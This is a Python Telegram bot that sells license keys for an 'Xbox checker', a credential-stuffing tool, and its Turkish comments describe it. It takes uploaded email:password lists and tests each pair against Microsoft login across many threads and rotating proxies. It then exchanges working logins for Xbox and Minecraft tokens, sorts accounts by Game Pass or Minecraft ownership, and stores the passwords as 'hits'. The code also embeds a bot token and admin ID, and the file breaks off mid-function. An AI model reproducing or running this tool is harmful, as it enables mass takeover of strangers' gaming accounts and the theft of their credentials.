
import os
import re
import time
import uuid
import json
import requests
import telebot
import urllib3
import warnings
from telebot import types
from threading import Thread, Lock
from urllib.parse import urlparse, parse_qs
from queue import Queue

# Gürültü kirliliği yaratan SSL ve kütüphane uyarılarını tamamen bastır
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# =====================================================================
# --- STRATEJİK AYARLAR VE GLOBAL TANIMLAMALAR ---
# =====================================================================
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577  # Değiştirilemez Ana Kurucu ID

bot = telebot.TeleBot(BOT_TOKEN)

# Veritabanı ve Konfigürasyon Dosya Yolları
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"
CONFIG_FILE = "config.json"

# Hafıza Katmanları ve Önbellekleme
user_sessions = {}  
active_tasks = {}   
user_hits = {} 
stats_lock = Lock()
file_lock = Lock()

# İstek ve Bağlantı Zaman Aşımı Parametreleri
MAX_RETRIES = 3
REQUEST_TIMEOUT = 10

# =====================================================================
# --- VERİTABANI İLKİLENDİRME VE DOSYA KONTROLLERİ ---
# =====================================================================
def initialize_system_files():
    """Sistemin çalışması için elzem olan tüm dosyaları güvenli bir şekilde oluşturur."""
    with file_lock:
        if not os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'w', encoding='utf-8') as f: 
                json.dump({}, f, indent=4)
        
        if not os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'w', encoding='utf-8') as f: 
                json.dump({}, f, indent=4)
                
        if not os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump({
                    "admins": [ADMIN_ID], 
                    "force_channel": "", 
                    "total_checked_global": 0,
                    "total_hits_global": 0
                }, f, indent=4)

        if not os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'w', encoding='utf-8') as f: 
                f.write("")

# Sistem dosyalarını hemen hazır hale getir
initialize_system_files()

# =====================================================================
# --- GÜVENLİ VE SENKRONİZE VERİ OKUMA / YAZMA MOTORU ---
# =====================================================================
def load_json(filename):
    """Belirtilen JSON dosyasını kilit mekanizması kullanarak güvenle okur."""
    with file_lock:
        try:
            with open(filename, 'r', encoding='utf-8') as f: 
                return json.load(f)
        except Exception:
            return {}

def save_json(filename, data):
    """Belirtilen veriyi JSON dosyasına kilit mekanizması kullanarak güvenle yazar."""
    with file_lock:
        try:
            with open(filename, 'w', encoding='utf-8') as f: 
                json.dump(data, f, indent=4)
            return True
        except Exception:
            return False

def load_proxies():
    """Sistemdeki aktif proxy listesini text dosyasından temizleyerek çeker."""
    with file_lock:
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        return []

# =====================================================================
# --- YETKİLENDİRME VE GEÇİŞ KONTROL SİSTEMLERİ ---
# =====================================================================
def is_admin(user_id):
    """Kullanıcının ana admin veya eklenmiş yardımcı admin olup olmadığını doğrular."""
    if user_id == ADMIN_ID:
        return True
    config = load_json(CONFIG_FILE)
    return user_id in config.get("admins", [])

def check_force_join(user_id):
    """Kullanıcının zorunlu kılınan kanalda bulunup bulunmadığını teyit eder."""
    config = load_json(CONFIG_FILE)
    channel = config.get("force_channel", "")
    if not channel:
        return True
    try:
        chat_member = bot.get_chat_member(channel, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception:
        # Kanal bulunamazsa veya bot kanalda admin değilse akış bozulmasın
        return True 

def check_user_access(user_id):
    """Kullanıcının aktif bir VIP lisansının olup olmadığını zaman damgasıyla kontrol eder."""
    if is_admin(user_id): 
        return True
    users = load_json(USERS_FILE)
    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): 
        return True
    return False

# =====================================================================
# --- XBOX & MICROSOFT & MINECRAFT DOĞRULAMA MOTORU (DOKUNULMADI) ---
# =====================================================================
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match: return match.group(1), sftag
        except: pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None": return token, "success"
                except: pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except: pass
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
                elif '"product_minecraft"' in text: return 'Minecraft'
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append('Dungeons')
                    if others: return 'Other: ' + ', '.join(others)
                    return None
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 429: time.sleep(2); continue
            elif response.status_code == 404: return None
        except: pass
        time.sleep(0.5)
    return None

# =====================================================================
# --- INTERFACE (UI) ARAYÜZ KLAVYELERİ ---
# =====================================================================
def main_keyboard(user_id):
    """Ana menü butonlarını dinamik olarak oluşturur."""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Tarama Başlat"), types.KeyboardButton("👤 Profilim"))
    if is_admin(user_id):
        markup.add(types.KeyboardButton("👑 Admin Paneli"))
    return markup

def admin_keyboard():
    """Gelişmiş admin kontrol paneli inline buton mimarisi."""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Key Üret", callback_data="adm_menu_genkey"),
        types.InlineKeyboardButton("📜 Aktif Keyler", callback_data="adm_menu_listkeys"),
        types.InlineKeyboardButton("🌐 Proxy Durumu", callback_data="adm_menu_proxystat"),
        types.InlineKeyboardButton("👤 Admin Yönetimi", callback_data="adm_menu_admins"),
        types.InlineKeyboardButton("📢 Global Duyuru", callback_data="adm_menu_broadcast"),
        types.InlineKeyboardButton("🔐 Sponsor Kanalı", callback_data="adm_menu_forcejoin"),
        types.InlineKeyboardButton("❌ Paneli Kapat", callback_data="adm_menu_close")
    )
    return markup

# =====================================================================
# --- MIDDLEWARE / KATMANLI KONTROL MEKANİZMASI ---
# =====================================================================
def execute_middleware_check(message):
    """Kullanıcının kanala üye olup olmadığını kontrol eder, üye değilse akışı keser."""
    if not check_force_join(message.from_user.id):
        config = load_json(CONFIG_FILE)
        channel = config.get("force_channel", "")
        text = (
            "🚨 **SİSTEM KİLİTLİ!** 🚨\n\n"
            "Botun fonksiyonlarını kullanabilmek için sponsor kanalımıza katılmanız gerekmektedir.\n\n"
            f"🔗 **Kanalımız:** {channel}\n\n"
            "Katıldıktan sonra bota tekrar erişmek için `/start` komutunu gönderin."
        )
        bot.send_message(message.chat.id, text, parse_mode="Markdown")
        return False
    return True

# =====================================================================
# --- ANA BOT KOMUTLARI ---
# =====================================================================
@bot.message_handler(commands=['start'])
def command_start(message):
    if not execute_middleware_check(message): 
        return
    user_id = message.from_user.id
    
    welcome_text = (
        "💤 **Sleeping Xbox Checker v2.0'a Hoş Geldiniz!** 💤\n"
        "----------------------------------------------\n"
        "Çoklu thread desteği ve optimize edilmiş altyapısıyla en hızlı tarama deneyimi.\n\n"
    )
    
    if check_user_access(user_id):
        welcome_text += "✅ **Erişiminiz Aktif!** Aşağıdaki menüyü kullanarak hemen tarama başlatabilirsiniz."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += (
            "❌ **Lisans Bulunamadı!**\n"
            "Sistemi kullanabilmek için geçerli bir anahtara sahip olmalısınız.\n\n"
            "🔑 Satın aldığınız anahtarı aktif etmek için:\n"
            "`/redeem ANAHTAR-KODU` şeklinde giriş yapın."
        )
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(commands=['stop'])
def command_stop(message):
    user_id = message.from_user.id
    if user_id in active_tasks and active_tasks[user_id]:
        active_tasks[user_id] = False 
        bot.send_message(message.chat.id, "🛑 **DURDURMA SİNYALİ GÖNDERİLDİ!**\nİş parçacıkları havuzu kapatılıyor, elde edilen hitler dışa aktarılıyor. Lütfen bekleyin...", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ Şu anda arka planda çalışan aktif bir tarama işleminiz bulunmuyor.")

@bot.message_handler(commands=['redeem'])
def command_redeem(message):
    if not execute_middleware_check(message): 
        return
    user_id = message.from_user.id
    tokens = message.text.split()
    
    if len(tokens) < 2:
        bot.send_message(message.chat.id, "⚠️ **Hatalı Kullanım!**\nDoğru format: `/redeem SLEEPING-XXXX-XXXX`", parse_mode="Markdown")
        return
        
    input_key = tokens[1].strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        keys[input_key]["used_at"] = time.strftime('%Y-%m-%d %H:%M:%S')
        duration = keys[input_key]["duration"]
        
        now = time.time()
        if str(user_id) in users and users[str(user_id)]["expiry"] > now:
            users[str(user_id)]["expiry"] += duration
        else:
            users[str(user_id)] = {
                "expiry": now + duration, 
                "username": message.from_user.username if message.from_user.username else "N/A",
                "activated_at": time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        
        day_val = duration // 86400
        bot.send_message(
            message.chat.id, 
            f"🎉 **TEBRİKLER!**\n\n`{day_val}` Günlük VIP lisansınız hesabınıza başarıyla tanımlandı. Sistem aktif edildi!", 
            parse_mode="Markdown", 
            reply_markup=main_keyboard(user_id)
        )
    else:
        bot.send_message(message.chat.id, "❌ **Başarısız!** Geçersiz, kullanılmış veya süresi dolmuş bir key girdiniz.")

# =====================================================================
# --- PROFiL VE KULLANICI DETAY KATMANI ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
def user_profile_handler(message):
    if not execute_middleware_check(message): 
        return
    user_id = message.from_user.id
    users = load_json(USERS_FILE)
    
    if is_admin(user_id):
        role_status = "👑 Kurucu / Sistem Yöneticisi"
        remaining_date = "Sınırsız / Ömür Boyu"
    elif str(user_id) in users:
        rem_time = users[str(user_id)]["expiry"] - time.time()
        if rem_time > 0:
            role_status = "💎 VIP Premium Üye"
            remaining_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
        else:
            role_status = "❌ Süresi Dolmuş Üye"
            remaining_date = "Süre Sonu"
    else:
        role_status = "👤 Standart / Lisanssız Üye"
        remaining_date = "Yok"
        
    profile_card = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "       👤 **KULLANICI PROFiL KARTI**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 **Hesap ID:** `{user_id}`\n"
        f"🎭 **Rütbe/Durum:** `{role_status}`\n"
        f"⏳ **Lisans Bitiş:** `{remaining_date}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(message.chat.id, profile_card, parse_mode="Markdown")

# =====================================================================
# --- GELİŞMİŞ ADMiN PANELİ VE ETKİLEŞİM HAVUZU ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli")
def admin_panel_trigger(message):
    if not is_admin(message.from_user.id): 
        return
    bot.send_message(
        message.chat.id, 
        "⚙️ **Sleeping Yönetim Merkezi**\nSistem durumunu, keyleri ve yetkileri anlık olarak bu panel üzerinden manipüle edebilirsiniz:", 
        reply_markup=admin_keyboard(), 
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_menu_"))
def admin_panel_callback_router(call):
    user_id = call.from_user.id
    if not is_admin(user_id): 
        bot.answer_callback_query(call.id, "Buna yetkiniz yok!", show_alert=True)
        return
        
    action = call.data.replace("adm_menu_", "")
    
    if action == "close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        
    elif action == "genkey":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("⏱️ 1 Günlük Key", callback_data="adm_create_86400"),
            types.InlineKeyboardButton("⏱️ 7 Günlük Key", callback_data="adm_create_604800"),
            types.InlineKeyboardButton("⏱️ 30 Günlük Key", callback_data="adm_create_2592000"),
            types.InlineKeyboardButton("🔙 Geri Dön", callback_data="adm_back_to_main")
        )
        bot.edit_message_text("🔑 Üretmek istediğiniz lisans süresini seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif action == "listkeys":
        keys = load_json(KEYS_FILE)
        report = "📜 **Kullanılmayan Aktif Key Listesi (Son 10):**\n\n"
        displayed = 0
        for k, v in keys.items():
            if not v["used"]:
                days = v["duration"] // 86400
                report += f"🔑 `{k}` | `{days} Günlük` \n"
                displayed += 1
            if displayed >= 10: 
                break
        if displayed == 0: 
            report += "Sistemde kullanılmamış aktif key bulunmuyor."
            
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri Dön", callback_data="adm_back_to_main"))
        bot.edit_message_text(report, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif action == "proxystat":
        p_list = load_proxies()
        bot.answer_callback_query(call.id, f"🌐 Toplam Yüklü Proxy: {len(p_list)} Adet", show_alert=True)
        
    elif action == "admins":
        user_sessions[user_id] = "state_waiting_admin_id"
        bot.edit_message_text(
            "👤 **Admin Ekleme / Çıkarma Birimi**\n\n"
            "Yeni admin atamak için direkt **Telegram ID** girin.\n"
            "Adminlikten çıkarmak için ID başına eksi işareti koyun (Örn: `-5162738`)", 
            call.message.chat.id, 
            call.message.message_id
        )
        
    elif action == "broadcast":
        user_sessions[user_id] = "state_waiting_broadcast_msg"
        bot.edit_message_text("📢 Tüm kayıtlı kullanıcılara gönderilecek ortak duyuru metnini yazın:", call.message.chat.id, call.message.message_id)
        
    elif action == "forcejoin":
        user_sessions[user_id] = "state_waiting_force_channel"
        config = load_json(CONFIG_FILE)
        current = config.get("force_channel", "Yok (Devre Dışı)")
        bot.edit_message_text(
            f"🔐 **Mevcut Zorunlu Kanal:** `{current}`\n\n"
            "Yeni zorunlu kanalı kullanıcı adıyla girin (Örn: `@cheatglobal`)\n"
            "İptal etmek için `iptal` yazmanız yeterlidir.", 
            call.message.chat.id, 
            call.message.message_id, 
            parse_mode="Markdown"
        )

@bot.callback_query_handler(func=lambda call: call.data == "adm_back_to_main")
def admin_back_to_main_menu(call):
    if not is_admin(call.from_user.id): 
        return
    bot.edit_message_text(
        "⚙️ **Sleeping Yönetim Merkezi**\nSistem durumunu, keyleri ve yetkileri anlık olarak bu panel üzerinden manipüle edebilirsiniz:", 
        call.message.chat.id, 
        call.message.message_id, 
        reply_markup=admin_keyboard(), 
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_create_"))
def admin_process_key_generation(call):
    if not is_admin(call.from_user.id): 
        return
    duration = int(call.data.replace("adm_create_", ""))
    new_uuid = str(uuid.uuid4()).upper().replace("-", "")[:12]
    generated_key = f"SLEEPING-{new_uuid}"
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {
        "duration": duration, 
        "used": False, 
        "used_by": None, 
        "created_at": time.strftime('%Y-%m-%d %H:%M:%S')
    }
    save_json(KEYS_FILE, keys)
    
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri Dön", callback_data="adm_back_to_main"))
    bot.edit_message_text(
        f"✅ **Key Başarıyla Üretildi!**\n\n`{generated_key}`\n\nKullanıcı bu anahtarı `/redeem {generated_key}` komutuyla kullanabilir.", 
        call.message.chat.id, 
        call.message.message_id, 
        parse_mode="Markdown", 
        reply_markup=markup
    )

# =====================================================================
# --- ADMiN STRiNG INPUT PROCESSOR (YAZI GİRİŞLERİ) ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.from_user.id in user_sessions and isinstance(user_sessions[msg.from_user.id], str))
def admin_string_inputs_handler(message):
    user_id = message.from_user.id
    state = user_sessions[user_id]
    
    if state == "state_waiting_admin_id":
        user_sessions[user_id] = None
        raw_text = message.text.strip()
        config = load_json(CONFIG_FILE)
        
        try:
            if raw_text.startswith("-"):
                target_id = int(raw_text.replace("-", "").strip())
                if target_id == ADMIN_ID:
                    bot.send_message(message.chat.id, "❌ Ana kurucu yetkisi elinden alınamaz!")
                    return
                if target_id in config.get("admins", []):
                    config["admins"].remove(target_id)
                    save_json(CONFIG_FILE, config)
                    bot.send_message(message.chat.id, f"❌ `{target_id}` ID'li kullanıcının admin yetkileri alındı.", parse_mode="Markdown")
                else:
                    bot.send_message(message.chat.id, "⚠️ Bu ID zaten admin listesinde bulunmuyor.")
            else:
                target_id = int(raw_text)
                if target_id not in config["admins"]:
                    config["admins"].append(target_id)
                    save_json(CONFIG_FILE, config)
                bot.send_message(message.chat.id, f"✅ `{target_id}` ID'li kullanıcı başarıyla yardımcı admin yapıldı.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "❌ Geçersiz format! Lütfen sadece sayısal ID girin.")
            
    elif state == "state_waiting_broadcast_msg":
        user_sessions[user_id] = None
        users = load_json(USERS_FILE)
        bot.send_message(message.chat.id, "📢 Global duyuru başlatıldı, tüm VIP üyelere gönderiliyor...")
        success_count = 0
        
        for uid in users.keys():
            try:
                bot.send_message(int(uid), f"📢 **SİSTEM GENEL DUYURUSU**\n\n{message.text}", parse_mode="Markdown")
                success_count += 1
                time.sleep(0.05)
            except Exception:
                pass
        bot.send_message(message.chat.id, f"🏁 Duyuru tamamlandı. `{success_count}` kullanıcıya başarıyla ulaştırıldı.", parse_mode="Markdown")
        
    elif state == "state_waiting_force_channel":
        user_sessions[user_id] = None
        input_channel = message.text.strip()
        config = load_json(CONFIG_FILE)
        
        if input_channel.lower() == "iptal":
            config["force_channel"] = ""
            bot.send_message(message.chat.id, "🔐 Kanala zorunlu katılım özelliği başarıyla devre dışı bırakıldı.")
        else:
            if not input_channel.startswith("@"):
                input_channel = "@" + input_channel
            config["force_channel"] = input_channel
            bot.send_message(message.chat.id, f"✅ Zorunlu sponsor kanalı `{input_channel}` olarak kilitlendi.", parse_mode="Markdown")
            
        save_json(CONFIG_FILE, config)

# =====================================================================
# --- TARAMA AKIŞI VE DİNAMİK THREAD AYARLARI ---
# =====================================================================
@bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
def flow_start_checker(message):
    if not execute_middleware_check(message): 
        return
    if not check_user_access(message.from_user.id): 
        return
        
    if active_tasks.get(message.from_user.id, False):
        bot.send_message(message.chat.id, "⚠️ **Zaten Çalışan Bir Tarama Var!**\nMevcut taramayı bitirmek için önce `/stop` komutunu kullanmalısınız.", parse_mode="Markdown")
        return
        
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🌐 Proxyli Mod", callback_data="setmode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless Mod", callback_data="setmode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 **Tarama Modu Seçimi**\nLütfen çalıştırmak istediğiniz bağlantı modunu seçin:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("setmode_"))
def flow_select_mode_and_request_threads(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "setmode_proxy" else "proxyless"
    
    if mode == "proxy" and not load_proxies():
        bot.answer_callback_query(call.id, "Sistemde yüklü proxy yok! Lütfen proxies.txt dosyasına proxy ekleyin.", show_alert=True)
        return
        
    user_sessions[user_id] = {"mode": mode, "step": "waiting_threads_count"}
    bot.edit_message_text(
        "🔢 **Eşzamanlı İş Parçacığı (Thread) Sayısı**\nTaramada aynı anda çalışacak thread miktarını girin:\n(Önerilen: 10 - Maksimum Limit: 100)", 
        call.message.chat.id, 
        call.message.message_id
    )

@bot.message_handler(content_types=['document', 'text'])
def flow_handle_threads_and_combos(message):
    user_id = message.from_user.id
    session_data = user_sessions.get(user_id)
    
    if not isinstance(session_data, dict): 
        return
        
    current_step = session_data.get("step")
    
    if current_step == "waiting_threads_count":
        try:
            t_count = int(message.text.strip())
            if t_count < 1 or t_count > 100:
                bot.send_message(message.chat.id, "❌ **Limit İhlali!** Gireceğiniz değer 1 ile 100 arasında olmalıdır. Tekrar girin:")
                return
            session_data["threads"] = t_count
            session_data["step"] = "waiting_combos_payload"
            bot.send_message(message.chat.id, "📂 **Combo Yükleme Adımı**\nTaranacak hesap listesini (email:şifre) doğrudan metin olarak yapıştırın veya `.txt` dosyası olarak gönderin:")
        except ValueError:
            bot.send_message(message.chat.id, "❌ Lütfen sadece sayısal bir değer girin:")
            
    elif current_step == "waiting_combos_payload":
        target_mode = session_data["mode"]
        allocated_threads = session_data.get("threads", 10)
        combos_list = []
        
        try:
            if message.document:
                bot.send_message(message.chat.id, "📥 Dosya sunucuya indiriliyor ve ayrıştırılıyor...")
                f_info = bot.get_file(message.document.file_id)
                downloaded = bot.download_file(f_info.file_path)
                decoded_text = downloaded.decode('utf-8', errors='ignore')
                combos_list = [line.strip() for line in decoded_text.splitlines() if line.strip() and ":" in line]
            elif message.text:
                combos_list = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
                
            if not combos_list:
                bot.send_message(message.chat.id, "❌ Geçerli bir `email:şifre` kombinasyonu yakalanamadı. Lütfen girdiyi kontrol edin:")
                return

            # Kullanıcı oturumunu temizle ve tarama bayraklarını kaldır
            user_sessions[user_id] = None
            bot.send_message(
                message.chat.id, 
                f"🚀 Taramaya Hazır!\n📦 **Toplam Hesap:** `{len(combos_list)}` adet\n🧵 **İş Parçacığı:** `{allocated_threads}` Thread\n\nAnlık takip tablosu birazdan aşağıda belirecektir.",
                parse_mode="Markdown"
            )
            
            user_hits[user_id] = []
            active_tasks[user_id] = True
            
            # Dağıtıcı orchestrator thread'ini tetikle
            orchestrator = Thread(target=multithreaded_checker_orchestrator, args=(user_id, combos_list, target_mode, allocated_threads, message.chat.id))
            orchestrator.daemon = True
            orchestrator.start()
            
        except Exception as ex:
            bot.send_message(message.chat.id, f"❌ Beklenmedik işlem hatası: {str(ex)}")

# =====================================================================
# --- ÇOKLU THREAD HAVUZU VE PAYLAŞIMLI ORCHESTRATOR ---
# =====================================================================
def multithreaded_checker_orchestrator(user_id, combos, mode, max_threads, chat_id):
    """Kuyruğa alınan tüm comboları belirlenen maksimum thread sayısına göre paralel işler."""
    proxies_pool = load_proxies()
    ui_monitor = bot.send_message(chat_id, "📊 **İş parçacığı havuzu ayağa kaldırılıyor...**", parse_mode="Markdown")
    
    local_stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
    total_payload = len(combos)
    
    # İş paylaşımı için senkronize kuyruk (Thread-Safe Queue)
    task_queue = Queue()
    for item in combos: 
        task_queue.put(item)
    
    def internal_worker(thread_offset):
        local_proxy_index = thread_offset
        while not task_queue.empty():
            # Kullanıcı durdurma sinyali verdiyse döngüden hemen çık
            if not active_tasks.get(user_id, False): 
                break
                
            current_combo = task_queue.get()
            elements = current_combo.split(':')
            target_email = elements[0]
            target_password = ':'.join(elements[1:])
            
            http_session = requests.Session()
            http_session.verify = False
            
            if mode == "proxy" and proxies_pool:
                selected_p = proxies_pool[local_proxy_index % len(proxies_pool)]
                local_proxy_index += 1
                http_session.proxies = {"http": f"http://{selected_p}", "https://{selected_p}": f"http://{selected_p}"}
                
            url_post, sftag = get_sftag(http_session)
            
            with stats_lock:
                local_stats["checked"] += 1
                
            if not url_post or not sftag:
                with stats_lock: 
                    local_stats["errors"] += 1
            else:
                ms_token, auth_status = microsoft_auth(http_session, target_email, target_password, url_post, sftag)
                if auth_status == "2fa":
                    with stats_lock: 
                        local_stats["twofa"] += 1
                elif auth_status == "bad": 
                    with stats_lock: 
                        local_stats["bad"] += 1
                elif auth_status == "success" and ms_token:
                    xbox_token, uhs = get_xbox_token(http_session, ms_token)
                    if xbox_token and uhs:
                        xsts_token = get_xsts_token(http_session, xbox_token)
                        if xsts_token:
                            mc_token = get_minecraft_token(http_session, uhs, xsts_token)
                            if mc_token:
                                account_type = check_minecraft_entitlements(http_session, mc_token)
                                if account_type:
                                    with stats_lock:
                                        if 'Ultimate' in account_type: local_stats["xgpu"] += 1
                                        elif 'Game Pass' in account_type: local_stats["xgp"] += 1
                                        elif 'Minecraft' in account_type: local_stats["mc"] += 1
                                        else: local_stats["other"] += 1
                                    
                                    profile_data = get_minecraft_profile(http_session, mc_token)
                                    ign_name, uuid_str, capes_str = "Ayarlanmamış", "N/A", "Yok"
                                    if profile_data:
                                        ign_name = profile_data.get('name', 'N/A')
                                        uuid_str = profile_data.get('id', 'N/A')
                                        capes_array = [c["alias"] for c in profile_data.get("capes", [])]
                                        if capes_array: 
                                            capes_str = ", ".join(capes_array)
                                    
                                    hit_payload = (
                                        f"✉️ Email: {target_email}\n"
                                        f"🔑 Password: {target_password}\n"
                                        f"🎮 Account Type: {account_type}\n"
                                        f"👤 IGN Name: {ign_name}\n"
                                        f"🆔 UUID: {uuid_str}\n"
                                        f"🛡️ Capes: {capes_str}\n"
                                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
                                    )
                                    with stats_lock: 
                                        user_hits[user_id].append(hit_payload)
                                else: 
                                    with stats_lock: local_stats["bad"] += 1
                            else: 
                                with stats_lock: local_stats["errors"] += 1
                        else: 
